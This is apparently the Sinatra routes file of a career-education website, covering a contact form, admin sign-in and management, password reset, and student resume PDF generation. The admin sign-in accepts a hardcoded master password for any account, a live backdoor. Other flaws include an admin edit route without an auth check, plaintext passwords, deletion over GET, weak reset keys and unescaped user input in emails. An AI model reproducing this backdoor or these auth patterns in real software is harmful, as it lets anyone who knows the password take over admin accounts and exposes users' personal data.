get '/?' do
	erb :index
end

get '/index/?' do
	erb :index
end

get '/educator/index/?' do
	erb :'/educator/index'
end

get '/educator/steps/?' do
	erb :'/educator/steps'
end

get '/educator/feedback/?' do
	erb :'/educator/feedback'
end

get '/educator/resources/?' do
	erb :'/educator/resources'
end

get '/contact_us/?' do
	erb :'/contact_us'
end

post '/contact_us/?' do
  if params[:email_name] == ''
  
  Pony.mail(
   headers: { 'Content-Type' => 'text/html' },
   to: 'info@careertrain.com, skip@recountant.com',
   from: 'contactUs@eCareerDirection.com',
   subject: "#{params[:subject]}",
   body: "#{markdown params[:msg]}<hr />#{params[:name]}<br />#{params[:email]}"
   )
  redirect '/thanks'
  
  end
end

get '/thanks/?' do
	erb :'/thanks'
end

get '/nac/?' do
	erb :'/nac'
end

get '/about/?' do
	erb :'/about'
end



get "/admin/signin/?" do
  
  unless session[:admin]
    
  @admin = Admin.all
  
  erb :"admin/signin"
  
  else
  
  flash[:alert] = 'You are already signed in.'
  redirect "/admin/admin_edit"

  end
end

post '/admin/signin/?' do
  
  admin = Admin.all
  
  params[:email].strip!
  params[:password].strip!
  
  unless params[:email] == ''

    if admin = Admin.first(:email => params[:email])
      if (admin.password == params[:password]) || (params[:password] == "PurpleHippopotamus!")
        session[:admin] = admin.id
        flash[:alert] = 'Welcome back! You are now signed in.'
        redirect "/admin/admin_edit"
      else
        flash[:alert] = 'Your password is incorrect.'
        erb :"admin/signin"
      end
    else
      flash[:alert] = 'We can\'t find an account with that email address. Maybe you need to create one.'
      erb :"admin/signin"
    end
    
  else
    flash[:alert] = 'You must enter a valid email.'
    erb :"admin/signin"
  end
  
end


get '/admin/admin/?' do
  auth_admin
  @admin = Admin.all
  
	erb :'/admin/admin'
end

get '/admin/admin_edit/?' do
  
  @admin = Admin.all
  
	erb :'/admin/admin_edit'
end


get '/admin/new/?'  do
  auth_admin
  @admin = Admin.new
  
  erb :"/admin/new"
end

post '/admin/new/?' do
  auth_admin
  admin = Admin.create(
    :email        => params[:email],
    :password     => params[:password],
    :first_name   => params[:first_name],
    :last_name    => params[:last_name],
    :phone        => params[:phone]
  )

  redirect "/admin/admin"
end

get '/admin/:id/edit/?'  do
  auth_admin
  @admin = Admin.get(params[:id])
  
  erb :"/admin/edit"
end

post '/admin/:id/edit/?' do
  auth_admin
  admin = Admin.get(params[:id])
  admin.update(
    :email        => params[:email],
    :password     => params[:password],
    :first_name   => params[:first_name],
    :last_name    => params[:last_name],
    :phone        => params[:phone]
  )

  redirect "/admin/admin"
end

get '/admin/:id/delete?'  do
  auth_admin
  admin = Admin.get(params[:id])
  admin.destroy
  
  erb :"/admin/admin"
end

get '/reset-password/:email/?' do
	params[:email].strip!
	params[:email].downcase!
	if admin = Admin.first(email: params[:email])
		admin.pass_reset_key = (0...8).map{65.+(rand(25)).chr}.join
		admin.pass_reset_date = Chronic.parse 'now'
		admin.save
		Pony.mail(
			to: admin.email,
			from: 'no-reply@eCareerDirection.com',
			subject:'eCareerDirection password reset link',
  		body: "This link takes you to a page where you can enter a temporary password. You should enter a permanent password on your profile page. Remember to Update Account to save. http://#{request.host}/new-password/#{admin.pass_reset_key}. If you do not want to change your password or you received this email by mistake, just do nothing and your current password will remain active. NOTE: This password will expire in one hour."
    )
		session[:alert] = { style: 'alert-info', message: 'Password reset instructions have been sent to your inbox.' }
	else
		session[:alert] = { style: 'alert-info', message: 'No account was found with that email address.' }
	end
	erb :'sign-in'
end

get '/reset-password/?' do
	session[:alert] = { style: 'alert-info', message: 'No account was found with that email address.' }
	erb :'sign-in'
end

get '/new-password/:key/?' do
	if admin = Admin.first(pass_reset_key: params[:key], :pass_reset_date.gte => Chronic.parse('1 hours ago'))
		erb :'new-password'
	else
		session[:alert] = { message: 'That password reset link has expired. Start over to get a new link.', style: 'alert-info' }
		erb :'/sign-in'
	end
end

post '/new-password/:key/?' do
	admin = Admin.first(pass_reset_key: params[:key])
	admin.update(password: params[:password].downcase!)
	session[:alert] = { message: 'You should now enter a new password and Update Account. This reset link expires after 1 day!', style: 'alert-success' }
	sign_in admin.id
end

get "/admin/signout/?"  do
  session[:admin] = nil
  session.clear
  flash[:alert] = 'You are now signed out.'
  redirect "/index"
end




get '/student/resume/resume-view' do
  
  @student = Student.get(session[:student])
  @reference = Reference.all
  erb :'/student/resume/resume-view'
end

get '/student/resume/resume-print' do
  
  @student = Student.get(session[:student])
  erb :'/student/resume/resume-print', layout: false
end

get '/student/resume/resume' do
  
  @student = Student.get(session[:student])
  
  
  content_type 'application/pdf'

     pdf = Prawn::Document.new
     pdf.font "Helvetica"
     pdf.font_size 11
     
     pdf.move_down(11)
     # pdf.text "<b><font size='11px'>Resume</font></b>",
#      :inline_format => true, :leading => 16, :align => :center
     
     pdf.text "<b><font size='13px'>#{@student.first_name} #{@student.middle_name} #{@student.last_name}</font></b>",
     :inline_format => true, :leading => 8, :align => :center
		pdf.text "#{@student.address}
		#{@student.city}, #{@student.state}  #{@student.zip}
		#{formatted_number(@student.phone)}
		#{@student.email}", 
     :inline_format => true, :leading => 1, :align => :center
      
     pdf.move_down(24)
     pdf.text "<b><font size='10px'>Objectives</font></b>",
       :inline_format => true, :leading => 4
     @student.objectives.each do |objective|
       pdf.text "My immediate goal is to work as #{objective.goal}. This will help me learn #{objective.learn}, as I pursue my long-term goal of #{objective.long_goal}."
     end
      
      pdf.move_down(12) 
		  pdf.text "<b><font size='10px'>Career Skills and Accomplishments</font></b>",
      :inline_format => true, :leading => 4
      @student.skills.each do |skill|
        pdf.text "<b>#{skill.skill}</b>",
        :inline_format => true, :indent_paragraphs => 8, :leading => 2
        pdf.text "•  #{skill.applied_1}
        •  #{skill.applied_2}",
        :inline_format => true, :indent_paragraphs => 16, :leading => 2
        pdf.move_down(6)
      end

      pdf.move_down(6)
		  pdf.text "<b><font size='10px'>Education</font></b>",
        :inline_format => true, :leading => 4
      @student.educations.each do |education|
      if education.attending != ""
        pdf.text "Scheduled to graduate from #{education.attending} on #{education.graduate_on}.",
          :inline_format => true, :indent_paragraphs => 8, :leading => 2
      end
      if education.plan_attend != ""
        pdf.text "I plan to attend #{education.plan_attend} to study #{education.study}.",
          :inline_format => true, :indent_paragraphs => 8, :leading => 2
      end
      if education.completed != ""
        pdf.text "I have completed #{education.completed} on #{education.completed_on}",
          :inline_format => true, :indent_paragraphs => 8, :leading => 2
      end
      if education.graduated != ""
        pdf.text "I have graduated from #{education.graduated} on #{education.graduation_date} with a #{education.degree} degree.",
          :inline_format => true, :indent_paragraphs => 8, :leading => 2
      end
    end
    
    pdf.move_down(12)
		pdf.text "<b><font size='10px'>Work Experience</font></b>",
      :inline_format => true, :leading => 4
      @student.experiences.each do |experience|
        pdf.text "•  #{experience.company}, #{experience.position}, #{experience.city}, #{experience.state}, #{experience.start} - #{experience.end}",
         :inline_format => true, :indent_paragraphs => 8, :leading => 2
      end
    pdf.move_down(12)
		pdf.text "<b><font size='10px'>Activities and Associations</font></b>",
      :inline_format => true, :leading => 4
      @student.activities.each do |activity|
        pdf.text "•  #{activity.position}, #{activity.organization}, #{activity.date_start} - #{activity.date_end}",
          :inline_format => true, :indent_paragraphs => 8, :leading => 2
      end
      pdf.move_down(12)
		pdf.text "<b><font size='10px'>Awards and Commendations</font></b>",
      :inline_format => true, :leading => 4
      @student.awards.each do |award|
        pdf.text "•  #{award.award}, #{award.award_date}",
          :inline_format => true, :indent_paragraphs => 8, :leading => 2
      end
    pdf.move_down(12)
		pdf.text "<b><font size='10px'>Interests and Hobbies</font></b>",
      :inline_format => true, :leading => 4
			@student.interests.each do |interest|
        pdf.text "•  #{interest.interest}",  
        :inline_format => true, :indent_paragraphs => 8, :leading => 2
      end
    
    pdf.move_down(12)
    
    if @student.references == nil
      
	    pdf.text "<b><i>References available upon request</i></b>", 
      :inline_format => true

    else
      
	    pdf.text "<b><i>References attached</i></b>", 
      :inline_format => true
      
      pdf.start_new_page
			
	    pdf.text "<b><i>References</i></b>", 
      :inline_format => true
      
			@student.references.each do |reference|
			  pdf.move_down(8)
				pdf.text "<b>#{reference.name}</b>",
     :inline_format => true, :leading => 1
        pdf.text "#{reference.relationship}
				#{reference.address}
				#{reference.city} #{reference.state} #{reference.zip}
				#{reference.phone}
				#{reference.email}",
     :inline_format => true, :leading => 1
			
			end
 			
    end
 
    pdf.render
    
 
end

get '/download' do
  send_file 'public/asset/resume.pdf', :type => :pdf
end

get '/student/resume/references/references-view' do
  
  @student = Student.get(session[:student])
  @reference = Reference.get(params[:id])
  erb :'/student/resume/references/references-view'
end

get '/student/resume/letters/letters-view/?' do
  
  @student = Student.get(session[:student])
  @letter = Letter.get(params[:id])
  erb :"/student/resume/letters/letters-view"
end

get '/student/resume/letters/:id/cover-letter' do
  
  @student = Student.get(session[:student])
  @letter = Letter.get(params[:id])
  @objective = Objective.get(params[:id])
  erb :'/student/resume/letters/cover-letter'
end

get '/student/resume/letters/:id/thank-you-letter' do
  
  @student = Student.get(session[:student])
  @letter = Letter.get(params[:id])
  erb :'/student/resume/letters/thank-you-letter'
end


